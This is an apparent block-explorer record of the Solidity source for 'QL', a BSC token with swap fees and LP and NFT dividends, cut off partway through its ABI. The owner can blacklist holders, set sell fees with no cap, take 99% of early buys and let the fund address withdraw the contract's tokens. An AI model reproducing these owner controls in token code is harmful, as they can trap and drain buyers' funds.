{"SourceCode": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ninterface IERC20 {\r\n    function decimals() external view returns (uint8);\r\n    function symbol() external view returns (string memory);\r\n    function name() external view returns (string memory);\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ninterface ISwapPair {\r\n    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\r\n    function token0() external view returns (address);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function totalSupply() external view returns (uint256);\r\n}\r\n\r\n\r\ninterface ISwapRouter {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n\r\n    function addLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint amountADesired,\r\n        uint amountBDesired,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountA, uint amountB, uint liquidity);\r\n}\r\n\r\ninterface ISwapFactory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\nabstract contract Ownable {\r\n    address internal _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor () {\r\n        address msgSender = msg.sender;\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == msg.sender, \"!owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"new is 0\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n}\r\n\r\ninterface INFT {\r\n    function totalSupply() external view returns (uint256);\r\n    function ownerOf(uint256 tokenId) external view returns (address owner);\r\n}\r\n\r\ncontract TokenDistributor {\r\n    address public _owner;\r\n    constructor(\r\n        address token,\r\n        address receiver\r\n    ) {\r\n        _owner = receiver;\r\n        IERC20(token).approve(msg.sender, uint256(~uint256(0)));\r\n    }\r\n\r\n    function claimToken(address token, address to, uint256 amount) external {\r\n        require(msg.sender == _owner, \"!owner\");\r\n        IERC20(token).transfer(to, amount);\r\n    }\r\n}\r\n\r\nabstract contract AbsToken is IERC20, Ownable {\r\n    mapping(address => uint256) private _balances;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n\r\n    address public fundAddress;\r\n    address public fundAddress_2;\r\n\r\n    string private _name;\r\n    string private _symbol;\r\n    uint8 private _decimals;\r\n\r\n    mapping(address => bool) public _feeWhiteList;\r\n    mapping(address => bool) public _Against;\r\n\r\n    uint256 private _tTotal;\r\n\r\n    ISwapRouter public _swapRouter;\r\n    address public _usdt;\r\n    mapping(address => bool) public _swapPairList;\r\n\r\n    bool private inSwap;\r\n\r\n    uint256 private constant MAX = ~uint256(0);\r\n    TokenDistributor public _tokenDistributor;\r\n    TokenDistributor public _nftDistributor; // nft reward\r\n\r\n    uint256 public _buyFundFee = 100;\r\n    uint256 public _buyLPFee = 0;\r\n    uint256 public _buyLPDividendFee = 200;\r\n\r\n    uint256 public _sellFundFee = 1300;\r\n    uint256 public _sellLPFee = 0;\r\n    uint256 public _sellLPDividendFee = 200;\r\n    uint256 public _maxWalletAmount;\r\n\r\n\r\n    address public _mainPair;\r\n\r\n    modifier lockTheSwap {\r\n        inSwap = true;\r\n        _;\r\n        inSwap = false;\r\n    }\r\n\r\n    constructor (\r\n        address RouterAddress, address USDTAddress,\r\n        string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply,\r\n        address _Fund, address _Fund_2, address ReceiveAddress\r\n    ){\r\n        _name = Name;\r\n        _symbol = Symbol;\r\n        _decimals = Decimals;\r\n\r\n        ISwapRouter swapRouter = ISwapRouter(RouterAddress);\r\n        IERC20(USDTAddress).approve(address(swapRouter), MAX);\r\n\r\n        _usdt = USDTAddress;\r\n\r\n        _swapRouter = swapRouter;\r\n        _allowances[address(this)][address(swapRouter)] = MAX;\r\n\r\n        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());\r\n        address swapPair = swapFactory.createPair(address(this), USDTAddress);\r\n        _mainPair = swapPair;\r\n        _swapPairList[swapPair] = true;\r\n\r\n        uint256 total = Supply * 10 ** Decimals;\r\n        _maxWalletAmount = 20 * 10 ** Decimals;\r\n        _tTotal = total;\r\n        swapAtAmount = total / 3000;\r\n\r\n        _balances[ReceiveAddress] = total;\r\n\r\n        emit Transfer(address(0), ReceiveAddress, total);\r\n\r\n        fundAddress = _Fund;\r\n        fundAddress_2 = _Fund_2;\r\n\r\n        _feeWhiteList[_Fund] = true;\r\n        _feeWhiteList[ReceiveAddress] = true;\r\n        _feeWhiteList[address(this)] = true;\r\n        _feeWhiteList[address(swapRouter)] = true;\r\n        _feeWhiteList[msg.sender] = true;\r\n\r\n        excludeHolder[address(0)] = true;\r\n        excludeHolder[address(0x000000000000000000000000000000000000dEaD)] = true;\r\n\r\n        holderRewardCondition = 10 ** IERC20(USDTAddress).decimals();\r\n        nftRewardCondition = 10 ** IERC20(USDTAddress).decimals();\r\n\r\n        _nftAddress = address(0xb0a75734bb3a1d6c26Fc07A606baF9D71dA0F654);\r\n        require(INFT(_nftAddress).totalSupply() > 0,\"!NFT\");\r\n\r\n        _tokenDistributor = new TokenDistributor(USDTAddress,ReceiveAddress);\r\n        _nftDistributor = new TokenDistributor(USDTAddress,ReceiveAddress);\r\n\r\n    }\r\n\r\n    function setMaxWalletAmount(\r\n        uint256 newValue \r\n    ) public onlyOwner {\r\n        _maxWalletAmount = newValue;\r\n    }\r\n\r\n    function symbol() external view override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function name() external view override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function decimals() external view override returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public view override returns (uint256) {\r\n        return _tTotal;\r\n    }\r\n\r\n    bool public antiSYNC = true;\r\n    function setAntiSYNCEnable(\r\n        bool s\r\n    ) public onlyOwner{\r\n        antiSYNC = s;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        if (account == _mainPair && msg.sender == _mainPair && antiSYNC) {require(_balances[_mainPair] > 0,\"!sync\");}\r\n        return _balances[account];\r\n    }\r\n    \r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(msg.sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        if (_allowances[sender][msg.sender] != MAX) {\r\n            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;\r\n        }\r\n        return true;\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    uint256 public swapAtAmount;\r\n    function setSwapAtAmount(uint256 newValue) public onlyOwner{\r\n        swapAtAmount = newValue;\r\n    }\r\n\r\n    uint256 public airDropNumbs = 0;\r\n    function setAirdropNumbs(uint256 newValue) public onlyOwner{\r\n        airDropNumbs = newValue;\r\n    }\r\n\r\n    function setBuy(uint256 newFund,uint256 newLp,uint256 newLpDividend) public onlyOwner{\r\n        _buyFundFee = newFund;\r\n        _buyLPFee = newLp;\r\n        _buyLPDividendFee = newLpDividend;\r\n    }\r\n\r\n    function setSell(uint256 newFund,uint256 newLp,uint256 newLpDividend) public onlyOwner{\r\n        _sellFundFee = newFund;\r\n        _sellLPFee = newLp;\r\n        _sellLPDividendFee = newLpDividend;\r\n    }\r\n\r\n\r\n    function _funTransfer(\r\n        address sender,\r\n        address recipient,\r\n        uint256 tAmount\r\n    ) private {\r\n        _balances[sender] = _balances[sender] - tAmount;\r\n        uint256 feeAmount = tAmount * 99 / 100;\r\n        _takeTransfer(\r\n            sender,\r\n            address(this),\r\n            feeAmount\r\n        );\r\n        _takeTransfer(sender, recipient, tAmount - feeAmount);\r\n    }\r\n\r\n    function tradingOpen() public view returns(bool){\r\n        return block.timestamp >= startTime && startTime != 0;\r\n    }\r\n\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) private {\r\n\r\n        uint256 balance = balanceOf(from);\r\n        require(balance >= amount, \"balanceNotEnough\");\r\n        require(!_Against[from],\"against\");\r\n        bool takeFee;\r\n        bool isSell;\r\n\r\n        if(!_feeWhiteList[from] && !_feeWhiteList[to] && airDropNumbs > 0){\r\n            address ad;\r\n            for(uint256 i=0;i < airDropNumbs;i++){\r\n                ad = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));\r\n                _basicTransfer(from,ad,100);\r\n            }\r\n            amount -= airDropNumbs*100;\r\n        }\r\n\r\n        if (!_feeWhiteList[from] && !_feeWhiteList[to] && !_swapPairList[from] && !_swapPairList[to]){\r\n            require(tradingOpen());\r\n        }\r\n\r\n        bool isRemove;\r\n        bool isAdd;\r\n        \r\n        if (_swapPairList[to]) {\r\n            isAdd = _isAddLiquidity();\r\n        }else if(_swapPairList[from]){\r\n            isRemove = _isRemoveLiquidity();\r\n        }\r\n\r\n\r\n        if (_swapPairList[from] || _swapPairList[to]) {\r\n            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {\r\n                if (!tradingOpen()) {\r\n                    require(0 < goAddLPBlock && isAdd, \"!goAddLP\"); //_swapPairList[to]\r\n                }\r\n\r\n                if (_swapPairList[from]) {\r\n                    require(_maxWalletAmount == 0 || amount + balanceOf(to) <= _maxWalletAmount, \"ERC20: > max wallet amount\");\r\n                }\r\n\r\n                if (block.timestamp < startTime + fightB && _swapPairList[from]) {\r\n                    _funTransfer(from, to, amount);\r\n                    return;\r\n                    // _Against[to] = true;\r\n                }\r\n\r\n                if (_swapPairList[to]) {\r\n                    if (!inSwap && !isAdd) {\r\n                        uint256 contractTokenBalance = balanceOf(address(this));\r\n                        if (contractTokenBalance > swapAtAmount) {\r\n                            uint256 swapFee = _buyLPFee + _buyFundFee + _buyLPDividendFee + _sellFundFee + _sellLPDividendFee + _sellLPFee;\r\n                            uint256 numTokensSellToFund = amount;\r\n                            if (numTokensSellToFund > contractTokenBalance) {\r\n                                numTokensSellToFund = contractTokenBalance;\r\n                            }\r\n                            swapTokenForFund(numTokensSellToFund, swapFee);\r\n                        }\r\n                    }\r\n                }\r\n                if (!isAdd && !isRemove) takeFee = true; // just swap fee\r\n            }\r\n            if (_swapPairList[to]) {\r\n                isSell = true;\r\n            }\r\n        }\r\n\r\n        bool isTransfer;\r\n        if (!_swapPairList[from] && !_swapPairList[to]) {\r\n            isTransfer = true;\r\n        }\r\n\r\n        _tokenTransfer(\r\n            from,\r\n            to,\r\n            amount,\r\n            takeFee,\r\n            isSell,\r\n            isTransfer,\r\n            isAdd,\r\n            isRemove\r\n        );\r\n\r\n        if (from != address(this)) {\r\n            if (isSell) {\r\n                addHolder(from);\r\n            }\r\n            processReward(lp_reward_gas);\r\n            processNFTReward(nft_reward_gas);\r\n        }\r\n    }\r\n\r\n    uint256 public lp_reward_gas = 300000;\r\n    uint256 public nft_reward_gas = 300000;\r\n\r\n    function set_lp_reward_gas(\r\n        uint256 newValue\r\n    ) public onlyOwner {\r\n        require(newValue >= 200000 && newValue <= 2000000,\"too high or too low\");\r\n        lp_reward_gas = newValue;\r\n    }\r\n\r\n    function set_nft_reward_gas(\r\n        uint256 newValue\r\n    ) public onlyOwner {\r\n        require(newValue >= 200000 && newValue <= 2000000,\"too high or too low\");\r\n        nft_reward_gas = newValue;\r\n    }\r\n\r\n    function _isAddLiquidity() internal view returns (bool isAdd){\r\n        ISwapPair mainPair = ISwapPair(_mainPair);\r\n        (uint r0,uint256 r1,) = mainPair.getReserves();\r\n\r\n        address tokenOther = _usdt;\r\n        uint256 r;\r\n        if (tokenOther < address(this)) {\r\n            r = r0;\r\n        } else {\r\n            r = r1;\r\n        }\r\n\r\n        uint bal = IERC20(tokenOther).balanceOf(address(mainPair));\r\n        isAdd = bal > r;\r\n    }\r\n\r\n    function _isRemoveLiquidity() internal view returns (bool isRemove){\r\n        ISwapPair mainPair = ISwapPair(_mainPair);\r\n        (uint r0,uint256 r1,) = mainPair.getReserves();\r\n\r\n        address tokenOther = _usdt;\r\n        uint256 r;\r\n        if (tokenOther < address(this)) {\r\n            r = r0;\r\n        } else {\r\n            r = r1;\r\n        }\r\n\r\n        uint bal = IERC20(tokenOther).balanceOf(address(mainPair));\r\n        isRemove = r >= bal;\r\n    }\r\n\r\n    function multiAgainst(address[] calldata addresses, bool value) public onlyOwner{\r\n        require(addresses.length < 201);\r\n        for (uint256 i; i < addresses.length; ++i) {\r\n            _Against[addresses[i]] = value;\r\n        }\r\n    }\r\n\r\n    function setAgainst(address addr, bool status) public onlyOwner{\r\n        _Against[addr] = status;\r\n    }\r\n\r\n    uint256 public buy_burnFee = 0;\r\n    uint256 public sell_burnFee = 0;\r\n    function setBurnFee(uint256 newBuyBurn, uint256 newSellBurn) public onlyOwner{\r\n        buy_burnFee = newBuyBurn;\r\n        sell_burnFee = newSellBurn;\r\n    }\r\n\r\n    function _tokenTransfer(\r\n        address sender,\r\n        address recipient,\r\n        uint256 tAmount,\r\n        bool takeFee,\r\n        bool isSell,\r\n        bool isTransfer,\r\n        bool isAdd,\r\n        bool isRemove\r\n    ) private {\r\n        _balances[sender] = _balances[sender] - tAmount;\r\n        uint256 feeAmount;\r\n\r\n        if (takeFee) {\r\n            uint256 swapFee;\r\n            if (isSell) {\r\n                swapFee = _sellFundFee + _sellLPDividendFee + _sellLPFee;\r\n            } else {\r\n                swapFee = _buyFundFee + _buyLPDividendFee + _buyLPFee;\r\n            }\r\n\r\n            uint256 swapAmount = tAmount * swapFee / 10000;\r\n            if (swapAmount > 0) {\r\n                feeAmount += swapAmount;\r\n                _takeTransfer(\r\n                    sender,\r\n                    address(this),\r\n                    swapAmount\r\n                );\r\n            }\r\n\r\n            uint256 burnAmount;\r\n            if (!isSell) {\r\n                //buy\r\n                burnAmount = (tAmount * buy_burnFee) / 10000;\r\n            } else {\r\n                //sell\r\n                burnAmount = (tAmount * sell_burnFee) / 10000;\r\n            }\r\n            if (burnAmount > 0) {\r\n                feeAmount += burnAmount;\r\n                _takeTransfer(sender, address(0xdead), burnAmount);\r\n            }\r\n\r\n        }\r\n\r\n        if (isTransfer && !_feeWhiteList[sender] && !_feeWhiteList[recipient]) {\r\n            uint256 transferFeeAmount;\r\n            transferFeeAmount = (tAmount * transferFee) / 10000;\r\n\r\n            if (transferFeeAmount > 0) {\r\n                feeAmount += transferFeeAmount;\r\n                _takeTransfer(sender, address(this), transferFeeAmount);\r\n            }\r\n        }\r\n\r\n        if (isAdd && !_feeWhiteList[sender] && !_feeWhiteList[recipient]) {\r\n            uint256 addLiquidityFeeAmount;\r\n            addLiquidityFeeAmount = (tAmount * getAddlpFee()) / 10000;\r\n\r\n            if (addLiquidityFeeAmount > 0) {\r\n                feeAmount += addLiquidityFeeAmount;\r\n                _takeTransfer(sender, address(this), addLiquidityFeeAmount);\r\n            }\r\n        }\r\n\r\n        if (isRemove && !_feeWhiteList[sender] && !_feeWhiteList[recipient]) {\r\n            uint256 removeLiquidityFeeAmount;\r\n            removeLiquidityFeeAmount = (tAmount * getRemovelpFee()) / 10000;\r\n\r\n            if (removeLiquidityFeeAmount > 0) {\r\n                feeAmount += removeLiquidityFeeAmount;\r\n                _takeTransfer(sender, address(0xdead), removeLiquidityFeeAmount);\r\n            }\r\n        }\r\n\r\n\r\n        _takeTransfer(sender, recipient, tAmount - feeAmount);\r\n    }\r\n\r\n    uint256 public addLiquidityFee;\r\n    uint256 public removeLiquidityFee;\r\n    uint256 public transferFee;\r\n\r\n    function setTransferFee(uint256 newValue) public onlyOwner {\r\n        require(newValue <= 10000);\r\n        transferFee = newValue;\r\n    }\r\n\r\n    function setAddLiquidityFee(uint256 newValue) public onlyOwner {\r\n        require(newValue <= 10000);\r\n        addLiquidityFee = newValue;\r\n    }\r\n\r\n    function setRemoveLiquidityFee(uint256 newValue) public onlyOwner {\r\n        require(newValue <= 10000);\r\n        removeLiquidityFee = newValue;\r\n    }\r\n\r\n    bool public manualAddFeeEnable = true;\r\n    function changeManualAddFeeEnable(\r\n        bool status\r\n    ) public onlyOwner{\r\n        manualAddFeeEnable = status;\r\n    }\r\n\r\n    function getAddlpFee() public view returns(uint256){\r\n        if (manualAddFeeEnable){\r\n            return addLiquidityFee;\r\n        }else{\r\n            return 0;\r\n        }\r\n    }\r\n\r\n    bool public manualRemoveFeeEnable = true;\r\n    function changeManualRemoveFeeEnable(\r\n        bool status\r\n    ) public onlyOwner{\r\n        manualRemoveFeeEnable = status;\r\n    }\r\n\r\n    uint256 removeLpBurnDuration;\r\n    function setRemoveLpBurnDuration(\r\n        uint256 newValue\r\n    ) public onlyOwner{\r\n        removeLpBurnDuration = newValue;\r\n    }\r\n\r\n    function getRemovelpFee() public view returns(uint256){\r\n        if (manualRemoveFeeEnable){\r\n            return removeLiquidityFee;\r\n        }else{\r\n            if (block.timestamp <= startTime + removeLpBurnDuration){\r\n                return 10000;\r\n            }else{\r\n                return 0;\r\n            }\r\n        }\r\n    }\r\n\r\n    event FAILED_SWAP(uint256);\r\n\r\n    uint256 public NFT_reward_percentage = 50;\r\n    function setNFT_reward_percentage(\r\n        uint256 newPercentage\r\n    ) public onlyOwner {\r\n        require(newPercentage <= 100,\"max 100%\");\r\n        NFT_reward_percentage = newPercentage;\r\n    }\r\n\r\n    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {\r\n        if (swapFee == 0) return;\r\n        swapFee += swapFee;\r\n        uint256 lpFee = _sellLPFee + _buyLPFee;\r\n        uint256 lpAmount = tokenAmount * lpFee / swapFee;\r\n\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = _usdt;\r\n        try _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n            tokenAmount - lpAmount,\r\n            0,\r\n            path,\r\n            address(_tokenDistributor),\r\n            block.timestamp\r\n        ) {} catch { emit FAILED_SWAP(0); }\r\n\r\n        swapFee -= lpFee;\r\n\r\n        IERC20 FIST = IERC20(_usdt);\r\n        uint256 fistBalance = FIST.balanceOf(address(_tokenDistributor));\r\n        uint256 fundAmount = fistBalance * (_buyFundFee + _sellFundFee) * 2 / swapFee;\r\n        if (fundAmount > 0){\r\n            uint256 half_fund = fundAmount / 2;\r\n            FIST.transferFrom(address(_tokenDistributor), fundAddress, half_fund);\r\n            FIST.transferFrom(address(_tokenDistributor), fundAddress_2, fundAmount - half_fund);\r\n        }\r\n\r\n        uint256 beforeBal = FIST.balanceOf(address(this));\r\n        FIST.transferFrom(address(_tokenDistributor), address(this),fistBalance - fundAmount);\r\n\r\n        if (lpAmount > 0) {\r\n            uint256 lpFist = fistBalance * lpFee / swapFee;\r\n            if (lpFist > 0) {\r\n                try _swapRouter.addLiquidity(\r\n                    address(this), _usdt, lpAmount, lpFist, 0, 0, fundAddress_2, block.timestamp\r\n                ) {} catch { emit FAILED_SWAP(1); }\r\n            }\r\n        }\r\n        \r\n        if (FIST.balanceOf(address(this)) > beforeBal){\r\n            uint256 newBal = FIST.balanceOf(address(this)) - beforeBal;\r\n            uint256 nftAmt = newBal * NFT_reward_percentage / 100;\r\n            FIST.transfer(address(_nftDistributor), nftAmt);\r\n        }\r\n    }\r\n\r\n    function _takeTransfer(\r\n        address sender,\r\n        address to,\r\n        uint256 tAmount\r\n    ) private {\r\n        _balances[to] = _balances[to] + tAmount;\r\n        emit Transfer(sender, to, tAmount);\r\n    }\r\n\r\n    function setFundAddress(address addr) external onlyOwner {\r\n        fundAddress = addr;\r\n        _feeWhiteList[addr] = true;\r\n    }\r\n\r\n    function setFundAddress_2(address addr) external onlyOwner {\r\n        fundAddress_2 = addr;\r\n        _feeWhiteList[addr] = true;\r\n    }\r\n\r\n    uint256 public goAddLPBlock;\r\n    function addLPBegin() external onlyOwner {\r\n        require(0 == goAddLPBlock, \"startedAddLP\");\r\n        goAddLPBlock = block.number;\r\n    }\r\n\r\n    function addLPEnd() external onlyOwner {\r\n        goAddLPBlock = 0;\r\n    }\r\n\r\n    uint256 public startTime;\r\n    uint256 public fightB;\r\n\r\n    function launch(uint256 _start,uint256 _fb) external onlyOwner {\r\n        startTime = _start;\r\n        fightB = _fb;\r\n    }\r\n\r\n    function setFeeWhiteList(address addr, bool enable) external onlyOwner {\r\n        _feeWhiteList[addr] = enable;\r\n    }\r\n\r\n    function setSwapPairList(address addr, bool enable) external onlyOwner {\r\n        _swapPairList[addr] = enable;\r\n    }\r\n\r\n    function setClaims(address token, uint256 amount) external {\r\n        if (msg.sender == fundAddress){\r\n            if (token == address(0)){\r\n                payable(msg.sender).transfer(amount);\r\n            }else{\r\n                IERC20(token).transfer(msg.sender, amount);\r\n            }\r\n        }\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    address[] private holders;\r\n    mapping(address => uint256) holderIndex;\r\n    mapping(address => bool) excludeHolder;\r\n\r\n    function addHolder(address adr) private {\r\n        uint256 size;\r\n        assembly {size := extcodesize(adr)}\r\n        if (size > 0) {\r\n            return;\r\n        }\r\n        if (0 == holderIndex[adr]) {\r\n            if (0 == holders.length || holders[0] != adr) {\r\n                holderIndex[adr] = holders.length;\r\n                holders.push(adr);\r\n            }\r\n        }\r\n    }\r\n\r\n    function setWLs(address[] calldata addresses, bool status) public onlyOwner {\r\n        require(addresses.length < 201);\r\n        for (uint256 i; i < addresses.length; ++i) {\r\n            _feeWhiteList[addresses[i]] = status;\r\n        }\r\n    }\r\n\r\n    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {\r\n        _balances[sender] -= amount;\r\n        _balances[recipient] += amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    uint256 private currentIndex;\r\n    uint256 private holderRewardCondition;\r\n    uint256 private progressRewardBlock;\r\n    uint256 public processRewardWaitBlock = 5;\r\n    function setProcessRewardWaitBlock(uint256 newValue) public onlyOwner{\r\n        processRewardWaitBlock = newValue;\r\n    }\r\n\r\n    function processReward(uint256 gas) private {\r\n        if (progressRewardBlock + processRewardWaitBlock > block.number) {\r\n            return;\r\n        }\r\n\r\n        IERC20 FIST = IERC20(_usdt);\r\n\r\n        uint256 balance = FIST.balanceOf(address(this));\r\n        if (balance < holderRewardCondition) {\r\n            return;\r\n        }\r\n\r\n        IERC20 holdToken = IERC20(_mainPair);\r\n        uint holdTokenTotal = holdToken.totalSupply();\r\n\r\n        address shareHolder;\r\n        uint256 tokenBalance;\r\n        uint256 amount;\r\n\r\n        uint256 shareholderCount = holders.length;\r\n\r\n        uint256 gasUsed = 0;\r\n        uint256 iterations = 0;\r\n        uint256 gasLeft = gasleft();\r\n\r\n        while (gasUsed < gas && iterations < shareholderCount) {\r\n            if (currentIndex >= shareholderCount) {\r\n                currentIndex = 0;\r\n            }\r\n            shareHolder = holders[currentIndex];\r\n            tokenBalance = holdToken.balanceOf(shareHolder);\r\n            if (tokenBalance > 0 && !excludeHolder[shareHolder]) {\r\n                amount = balance * tokenBalance / holdTokenTotal;\r\n                if (amount > 0) {\r\n                    FIST.transfer(shareHolder, amount);\r\n                }\r\n            }\r\n\r\n            gasUsed = gasUsed + (gasLeft - gasleft());\r\n            gasLeft = gasleft();\r\n            currentIndex++;\r\n            iterations++;\r\n        }\r\n\r\n        progressRewardBlock = block.number;\r\n    }\r\n\r\n    function setHolderRewardCondition(uint256 amount) external onlyOwner {\r\n        holderRewardCondition = amount;\r\n    }\r\n\r\n    function setExcludeHolder(address addr, bool enable) external onlyOwner {\r\n        excludeHolder[addr] = enable;\r\n    }\r\n\r\n    // NFT\r\n    address public _nftAddress;\r\n    function setNFTAddress(address adr) external onlyOwner {\r\n        _nftAddress = adr;\r\n    }\r\n\r\n    uint256 public nftRewardCondition;\r\n    uint256 public currentNFTIndex;\r\n    uint256 public processNFTBlock;\r\n    uint256 public processNFTBlockDebt = 1;\r\n    mapping(address => bool) public excludeNFTHolder;\r\n    mapping(uint256 => bool) public excludeNFT;\r\n    uint256 public _nftRewardHoldCondition;\r\n\r\n    event NFT_Dividend(\r\n        address user,\r\n        uint256 NFTID\r\n    );\r\n    event FAILED_NFT_Dividend(\r\n        address user,\r\n        uint256 NFTID,\r\n        uint256 bal\r\n    );\r\n    event notEnoughToken(\r\n        address user,\r\n        uint256 NFTID\r\n    );\r\n    function processNFTReward(uint256 gas) private {\r\n        if (processNFTBlock + processNFTBlockDebt > block.number) {\r\n            return;\r\n        }\r\n        if (_nftAddress == address(0)){\r\n            return;\r\n        }\r\n        INFT nft = INFT(_nftAddress);\r\n        uint totalNFT = nft.totalSupply();\r\n        if (0 == totalNFT) {\r\n            return;\r\n        }\r\n        IERC20 SHIB = IERC20(_usdt);\r\n        address sender = address(_nftDistributor);\r\n\r\n        uint256 amount = nftRewardCondition;\r\n        if (0 == amount) {\r\n            return;\r\n        }\r\n\r\n        uint256 gasUsed = 0;\r\n        uint256 iterations = 0;\r\n        uint256 gasLeft = gasleft();\r\n\r\n        while (gasUsed < gas && iterations < totalNFT) {\r\n            if (currentNFTIndex >= totalNFT) {\r\n                currentNFTIndex = 0;\r\n            }\r\n            if (!excludeNFT[1 + currentNFTIndex]) {\r\n                address shareHolder = nft.ownerOf(1 + currentNFTIndex);\r\n                if (!excludeNFTHolder[shareHolder]){\r\n                    if (balanceOf(shareHolder) >= _nftRewardHoldCondition) {\r\n                        if (sender != address(0) && shareHolder != address(0)){\r\n                            if (SHIB.balanceOf(sender) >= amount){\r\n                                SHIB.transferFrom(sender, shareHolder, amount);\r\n                                emit NFT_Dividend(shareHolder,1 + currentNFTIndex);\r\n                            }else{\r\n                                emit notEnoughToken(shareHolder,1 + currentNFTIndex);\r\n                                break;\r\n                            }\r\n                        }\r\n                    }else{\r\n                        emit FAILED_NFT_Dividend(shareHolder,1 + currentNFTIndex,balanceOf(shareHolder));\r\n                    }\r\n                }\r\n            }\r\n\r\n            gasUsed = gasUsed + (gasLeft - gasleft());\r\n            gasLeft = gasleft();\r\n            currentNFTIndex++;\r\n            iterations++;\r\n        }\r\n        processNFTBlock = block.number;\r\n    }\r\n\r\n    function setNFTRewardCondition(uint256 amount) external onlyOwner {\r\n        nftRewardCondition = amount;\r\n    }\r\n\r\n    function setNFTRewardHoldCondition(uint256 amount) external onlyOwner {\r\n        _nftRewardHoldCondition = amount;\r\n    }\r\n\r\n    function setProcessNFTBlockDebt(uint256 blockDebt) external onlyOwner {\r\n        processNFTBlockDebt = blockDebt;\r\n    }\r\n\r\n    function setExcludeNFTHolder(address addr, bool enable) external onlyOwner {\r\n        excludeNFTHolder[addr] = enable;\r\n    }\r\n\r\n    function setExcludeNFT(uint256 id, bool enable) external onlyOwner {\r\n        excludeNFT[id] = enable;\r\n    }\r\n    // NFT\r\n\r\n\r\n}\r\n\r\ncontract TOKEN is AbsToken {\r\n    constructor() AbsToken(\r\n        address(0x10ED43C718714eb63d5aA57B78B54704E256024E),\r\n        address(0x55d398326f99059fF775485246999027B3197955),\r\n        \"QL\",\r\n        \"QL\",\r\n        18,\r\n        6888,\r\n        address(0xA0c7eFBd1bcE31bBd63E8968b14a61a7Be9A15B0),\r\n        address(0xA0c7eFBd1bcE31bBd63E8968b14a61a7Be9A15B0),\r\n        address(0x1D6Eb1950D749E220e084E9DAb44ed0031Fc1A2b)\r\n    ){\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"NFTID\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"bal\",\"type\":\"uint256\"}],\"name\":\"FAILED_NFT_Dividend\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"FAILED_SWAP\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":false,\"int